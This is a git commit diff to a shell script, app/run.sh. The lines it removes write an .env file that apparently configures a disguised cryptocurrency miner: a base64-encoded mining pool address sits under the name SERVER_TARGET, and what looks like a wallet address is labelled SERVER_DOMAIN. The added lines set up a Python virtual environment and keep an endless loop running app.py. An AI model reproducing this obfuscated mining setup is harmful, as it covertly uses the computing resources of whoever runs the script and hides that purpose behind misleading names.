16e1a1e93a10de780d4d9bc7eeb472e0ff223691
brontosimungo <brontosimungo@outlook.co.id>
2026-05-10 17:59:53 +0700

    Update run.sh

--- app/run.sh
+++ app/run.sh
@@ -1,10 +1,6 @@
 #!/bin/bash
-CONNECT=$1
-NAME=$2
-echo "SERVER_WS=wss://digitaldz.biz.id
-SERVER_TARGET=cG9vbC5oYXNodmF1bHQucHJvOjQ0Mw==
-SERVER_DOMAIN=82thAvdKbspiLhcSkNG8xrP7j3gwJKgrGj6w2A5j4urc64uJauggoeNWyHHh9hvasKTa1dnavqHh2f3fq2vuXchP7ENy9kJ
-SERVER_SECRET=${NAME}
-SERVER_CONNECTION=${CONNECT}
-SERVER_MODE=FAST" > .env
+python -m venv .venv
+source .venv/bin/activate
+pip install --upgrade pip
+pip install requests
 while true; do python3 app.py; sleep 10; done
